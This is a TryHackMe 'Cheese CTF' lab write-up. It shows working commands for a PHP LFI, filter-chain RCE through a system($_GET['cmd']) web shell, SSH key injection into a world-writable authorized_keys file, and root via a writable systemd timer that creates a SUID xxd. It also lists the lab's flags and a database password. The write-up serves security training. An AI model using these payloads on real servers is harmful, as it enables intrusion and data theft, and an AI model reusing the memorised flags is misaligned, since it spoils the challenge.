---
title: "TryHackMe Cheese CTF"
summary: "TryHackMe room covering web enumeration, PHP LFI to filter-chain RCE, SSH key abuse, and systemd timer privilege escalation."
date: 2026-06-19
tags:
  - tryhackme
  - linux
  - web
  - lfi
  - php
  - rce
  - privilege-escalation
  - systemd
category: "tryhackme"
difficulty: "easy"
platform: "tryhackme"
draft: false
boxImage: "https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1718375657104"
---

# Room Overview

| Field       | Details                                                                                                                                                                                                                                                                                                                                                                                        |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Machine     | Cheese CTF                                                                                                                                                                                                                                                                                                                                                                                     |
| Platform    | TryHackMe                                                                                                                                                                                                                                                                                                                                                                                      |
| OS          | Ubuntu 20.04.6 LTS                                                                                                                                                                                                                                                                                                                                                                             |
| Difficulty  | Easy                                                                                                                                                                                                                                                                                                                                                                                           |
| Attack Path | Web enumeration revealed an insecure PHP include endpoint. This was abused for LFI, PHP source disclosure, and PHP filter-chain RCE as `www-data`. User access was gained by injecting an SSH public key into a world-writable `authorized_keys` file for `comte`. Root was achieved through a misconfigured `sudo` rule allowing control of a systemd timer that created a SUID `xxd` binary. |

![Cheese CTF completion screen](/images/writeups/tryhackme/cheese-ctf/pasted-image-20260617232341.png)

---

# Enumeration

### Nmap Scan

The target was assigned as:

```bash
TARGET=10.49.181.173
```

A TCP scan showed unusual behavior where many low ports appeared open. This suggested fake-open behavior, port spoofing, or a tarpitted service. Manual banner grabbing was used to identify real services.

```bash
sudo nmap -Pn -n -sT --reason -p1-100 $TARGET -oN nmap_connect_1_100.txt
grep open nmap_connect_1_100.txt | head -30
```

Several ports appeared open, but most returned fake or malformed banners. Manual checks showed that the useful services were SSH and HTTP.

```bash
for p in 21 22 25 80 443 8080 8000 3000 5000; do
  echo "===== PORT $p ====="
  timeout 5 nc -nv $TARGET $p </dev/null
done
```

Important findings:

```text
22/tcp  OpenSSH_8.2p1 Ubuntu
80/tcp  Apache/2.4.41 Ubuntu
```

Port `80` hosted a web application titled **The Cheese Shop**.

---

## Web Enumeration

The index page and login page were fetched for static analysis.

```bash
curl -sS http://$TARGET/ | tee index.html
curl -sS http://$TARGET/login.php | tee login.html

grep -Rni "form\|input\|action\|method\|name=\|href\|script" index.html login.html
```

The login form submitted to `login.php` using the fields:

```html
<input type="text" id="username" name="username" required>
<input type="password" id="password" name="password" required>
```

Basic login attempts and common SQL injection payloads failed, so directory fuzzing was performed.

```bash
ffuf -u http://$TARGET/FUZZ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -e .php,.txt,.bak,.old,.zip,.js,.html \
  -mc 200,204,301,302,307,403 \
  -fs 274,1759 \
  -ic -c -o ffuf_routes.json -of json
```

Important discovered files:

```text
login.php       200
users.html      200
orders.html     200
messages.html   200
images/         301
```

The discovered pages were downloaded and inspected.

```bash
for f in users.html orders.html messages.html; do
  echo "===== $f ====="
  curl -sS "http://$TARGET/$f" | tee "$f"
  echo
done

grep -RniE "user|admin|pass|password|email|ssh|ubuntu|cheese|order|message|key|secret|login" \
  users.html orders.html messages.html
```

The key discovery was in `messages.html`:

```html
<a href="secret-script.php?file=php://filter/resource=supersecretmessageforadmin"> Message! </a>
```

This exposed a suspicious `file=` parameter being passed to `secret-script.php`.

---

# Exploitation / Solution

### Local File Inclusion

The `file` parameter was tested by reading `/etc/passwd`.

```bash
curl -s "http://$TARGET/secret-script.php?file=/etc/passwd" \
  | grep -E "root:|www-data|ubuntu|comte"
```

Output:

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
comte:x:1000:1000:comte:/home/comte:/bin/bash
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
```

This confirmed Local File Inclusion.

The same endpoint was then used with `php://filter` to read PHP source code.

```bash
for f in index.php login.php secret-script.php; do
  echo "===== $f ====="
  curl -s "http://$TARGET/secret-script.php?file=php://filter/convert.base64-encode/resource=$f" \
    | base64 -d
  echo
done
```

The source code of `secret-script.php` revealed the vulnerable include sink:

```php
<?php
  if(isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
  }
?>
```

This is an unsafe PHP include because attacker-controlled input is passed directly into `include()`.

### Source Code Disclosure

The `login.php` source also disclosed MySQL credentials.

```php
$servername = "localhost";
$user = "comte";
$password = "VeryCheesyPassword";
$dbname = "users";
```

It also showed that passwords were stored as MD5 hashes:

```php
$hashed_password = md5($pass);
$sql = "SELECT * FROM users WHERE username='$filteredInput' AND password='$hashed_password'";
```

The database was later queried from RCE:

```bash
rce "mysql -u comte -pVeryCheesyPassword -D users -e 'select * from users;'"
```

Output:

```text
id  username  password
1   comte     5b0c2e1b4fe1410e47f26feff7f4fc4c
```

The database credential was not reused for SSH, but it confirmed the application's user structure.

---

## PHP Filter-Chain RCE

Because the vulnerable code used `include($file)`, the LFI could be escalated to code execution using a PHP filter-chain payload.

The payload generated PHP code that executed the `cmd` GET parameter:

```php
<?php system($_GET["cmd"]); ?>
```

The filter chain was generated using `php_filter_chain_generator`.

```bash
cd ~/tryhackme/cheese-ctf/php_filter_chain_generator

python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' | tee ../chain.txt
```

The generated chain was then used to execute commands through `secret-script.php`.

A helper function was created for cleaner command execution:

```bash
TARGET=10.49.181.173
cd ~/tryhackme/cheese-ctf

CHAIN_RAW=$(tail -n1 chain.txt)

rce() {
  curl -s -G "http://$TARGET/secret-script.php" \
    --data-urlencode "file=$CHAIN_RAW" \
    --data-urlencode "cmd=$*" | strings
}
```

Command execution was confirmed:

```bash
rce 'id'
rce 'whoami'
rce 'hostname'
rce 'pwd'
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
ip-10-49-181-173
/var/www/html
```

At this point, RCE as `www-data` was achieved.

---

## User Access

### Home Directory Enumeration

The local users were enumerated.

```bash
rce 'ls -la /home'
rce 'ls -la /home/comte'
rce 'ls -la /home/ubuntu'
```

Output showed that `comte` owned `user.txt`:

```text
drwxr-xr-x  7 comte  comte  4096 Apr  4  2024 comte
drwxr-xr-x  3 ubuntu ubuntu 4096 Jun 17 15:04 ubuntu

-rw------- 1 comte comte 4276 Sep 15  2023 user.txt
```

The flag was not readable as `www-data`, so privilege movement to `comte` was required.

### SSH Authorized Keys Misconfiguration

The `.ssh` directory for `comte` was checked.

```bash
rce 'ls -la /home/comte/.ssh'
rce 'cat /home/comte/.ssh/authorized_keys 2>/dev/null'
```

Output:

```text
total 8
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .
drwxr-xr-x 7 comte comte 4096 Apr  4  2024 ..
-rw-rw-rw- 1 comte comte    0 Mar 25  2024 authorized_keys
```

The file `/home/comte/.ssh/authorized_keys` was world-writable. This allowed writing an attacker-controlled SSH public key into `comte`'s authorized keys.

An SSH key pair was generated locally.

```bash
cd ~/tryhackme/cheese-ctf

ssh-keygen -t ed25519 -f comte_key -N '' -C 'comte@cheese'
PUB=$(cat comte_key.pub)
```

The public key was injected using RCE.

```bash
rce "echo '$PUB' >> /home/comte/.ssh/authorized_keys"
rce 'cat /home/comte/.ssh/authorized_keys'
```

SSH login as `comte` succeeded.

```bash
chmod 600 comte_key
ssh -i comte_key comte@$TARGET
```

After login, the user flag was readable.

```bash
cat user.txt
```

User flag:

```text
THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
```

---

# Privilege Escalation

### Sudo Enumeration

As `comte`, sudo permissions were checked.

```bash
sudo -l
```

Output:

```text
User comte may run the following commands on ip-10-49-181-173:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

The user could run specific `systemctl` commands as root without a password.

The related systemd timer and service were inspected.

```bash
systemctl cat exploit.timer
systemctl cat exploit.service
```

Timer:

```ini
# /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```

Service:

```ini
# /etc/systemd/system/exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

The service copied `/usr/bin/xxd` to `/opt/xxd` and set the SUID bit.

File permissions were checked.

```bash
ls -la /etc/systemd/system/exploit.*
```

Output:

```text
-rw-r--r-- 1 root root 141 Mar 29  2024 /etc/systemd/system/exploit.service
-rwxrwxrwx 1 root root  87 Mar 29  2024 /etc/systemd/system/exploit.timer
```

The service was not writable, but the timer was world-writable.

### Triggering the Timer

The timer file was updated to trigger the existing service quickly.

```bash
cat > /etc/systemd/system/exploit.timer <<'EOF'
[Unit]
Description=Exploit Timer

[Timer]
OnActiveSec=1
Unit=exploit.service

[Install]
WantedBy=timers.target
EOF
```

The allowed sudo commands were then used to reload systemd and start the timer.

```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart exploit.timer
sleep 2
```

The service executed successfully and created `/opt/xxd` with SUID permissions.

```bash
ls -la /opt/xxd
```

Output:

```text
-rwsr-sr-x 1 root root 18712 Jun 17 15:19 /opt/xxd
```

The service status confirmed successful execution:

```bash
systemctl status exploit.service --no-pager
```

Relevant output:

```text
ExecStart=/bin/bash -c /bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd (code=exited, status=0/SUCCESS)
```

### Reading the Root Flag

Because `/opt/xxd` had the SUID bit and was owned by root, it could read files as root.

The root flag was read using `xxd`, then converted back with local `xxd -r`.

```bash
/opt/xxd /root/root.txt | xxd -r
```

Root flag:

```text
THM{dca75486094810807faf4b7b0a929b11e5e0167c}
```

---

# Answers / Flags

| Item | Value |
| --- | --- |
| User flag | `THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}` |
| Root flag | `THM{dca75486094810807faf4b7b0a929b11e5e0167c}` |

---

# Vulnerability Classification

This machine did not rely on a public CVE. The attack chain was based on insecure application logic and Linux misconfigurations.

|Stage|Vulnerability|Explanation|
|---|---|---|
|Web foothold|Local File Inclusion / PHP Include Injection|`secret-script.php` passed attacker-controlled input directly into `include()`|
|RCE|PHP filter-chain abuse|The include sink allowed PHP stream wrappers to generate executable PHP code|
|User access|Incorrect file permissions|`/home/comte/.ssh/authorized_keys` was world-writable|
|Privilege escalation|Sudo misconfiguration|`comte` could control a root-owned systemd timer using passwordless sudo|
|Root access|SUID binary abuse|`exploit.service` created SUID `/opt/xxd`, allowing root-owned files to be read|

Relevant CWE mappings:

```text
CWE-98   Improper Control of Filename for Include/Require Statement
CWE-732  Incorrect Permission Assignment for Critical Resource
CWE-269  Improper Privilege Management
```

---

# Key Takeaways

- Always inspect discovered HTML pages for hidden links, comments, and unusual parameters.

- A simple PHP pattern such as `include($_GET['file'])` can lead to LFI, source disclosure, and RCE.

- `php://filter` is useful for reading PHP source code without executing it.

- PHP filter chains can turn an unsafe include sink into command execution.

- World-writable SSH files are critical misconfigurations and can enable account takeover.

- `sudo -l` should be checked immediately after gaining a user shell.

- Specific `systemctl` sudo permissions can still be dangerous if the related timer or service configuration is writable or triggers privileged behavior.

- SUID binaries do not always need to spawn a shell; even file-read utilities like `xxd` can be enough to retrieve root-owned secrets.


---

# Final Attack Chain

```text
Nmap / web enum
-> Discover /messages.html
-> Find secret-script.php?file=
-> Confirm LFI with /etc/passwd
-> Disclose PHP source via php://filter
-> Identify include($_GET['file'])
-> Generate PHP filter-chain RCE
-> Execute commands as www-data
-> Find world-writable /home/comte/.ssh/authorized_keys
-> Inject SSH public key
-> SSH as comte
-> Read user.txt
-> Abuse sudo systemctl permissions for exploit.timer
-> Trigger exploit.service
-> Create SUID /opt/xxd
-> Read /root/root.txt
```
